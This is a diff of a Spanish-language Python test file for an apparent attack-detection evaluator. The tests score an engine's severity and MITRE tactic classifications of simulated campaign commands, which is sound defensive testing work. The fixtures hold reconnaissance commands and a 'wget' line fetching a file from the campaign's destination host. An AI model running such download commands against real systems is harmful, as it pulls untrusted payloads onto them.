@@ -46,10 +46,10 @@ def test_la_descarga_apunta_a_documentacion() -> None:
 
 
 def _decision(
-    comando: str, severidad: str, tactica: str | None, copiada: bool = False
+    doc_id: str, severidad: str, tactica: str | None, copiada: bool = False
 ) -> dict[str, Any]:
     return {
-        "evento": {"categoria": "process", "comando": comando, "origen": "10.0.0.5"},
+        "evento": {"categoria": "process", "doc_id": doc_id, "origen": "10.0.0.5"},
         "decision": {"severidad": severidad, "tactica_mitre": tactica},
         "ciclo": {"reutilizada_de": "otro" if copiada else None},
     }
@@ -60,18 +60,20 @@ def _corrida() -> dict[str, Any]:
 
 
 def test_la_comparacion_empareja_y_cuenta_los_aciertos() -> None:
+    descarga = f"wget http://{campana.DESTINO}/a"
     decisiones = [
-        _decision("uname -a", "alto", "Descubrimiento"),  # acierta en todo
-        _decision("whoami", "alto", "Ejecución"),  # acierta severidad, falla táctica
-        _decision(f"wget http://{campana.DESTINO}/a", "critico", None, copiada=True),
+        _decision("a", "alto", "Descubrimiento"),  # acierta en todo
+        _decision("b", "alto", "Ejecución"),  # acierta severidad, falla táctica
+        _decision("c", "critico", None, copiada=True),
         {  # una autenticación, que se cuenta aparte
-            "evento": {"categoria": "authentication", "origen": "10.0.0.5"},
+            "evento": {"categoria": "authentication", "doc_id": "d", "origen": "10.0.0.5"},
             "decision": {"severidad": "bajo", "tactica_mitre": "Acceso a credenciales"},
             "ciclo": {},
         },
-        _decision("comando que nadie envió", "alto", "Ejecución"),  # sin emparejar
+        _decision("e", "alto", "Ejecución"),  # comando que nadie envió: sin emparejar
     ]
-    r = campana.comparar(_corrida(), decisiones)
+    comandos = {"a": "uname -a", "b": "whoami", "c": descarga, "e": "comando que nadie envió"}
+    r = campana.comparar(_corrida(), decisiones, comandos)
 
     assert r["emparejadas"] == 3
     assert r["sin_emparejar"] == 1
@@ -88,8 +90,9 @@ def test_la_comparacion_empareja_y_cuenta_los_aciertos() -> None:
 def test_el_impacto_separa_la_descarga_de_la_escala() -> None:
     """La misma descarga es crítica para la escala y alta para el impacto: la comparación tiene que
     poder mostrar que el motor acierta una referencia y no la otra."""
-    decisiones = [_decision(f"wget http://{campana.DESTINO}/a", "critico", None)]
-    r = campana.comparar(_corrida(), decisiones)
+    decisiones = [_decision("x", "critico", None)]
+    comandos = {"x": f"wget http://{campana.DESTINO}/a"}
+    r = campana.comparar(_corrida(), decisiones, comandos)
 
     assert campana._aciertos(r["severidad_escala"]) == (1, 1)  # obtuvo crítico, esperaba crítico
     assert campana._aciertos(r["severidad_impacto"]) == (0, 1)  # esperaba alto
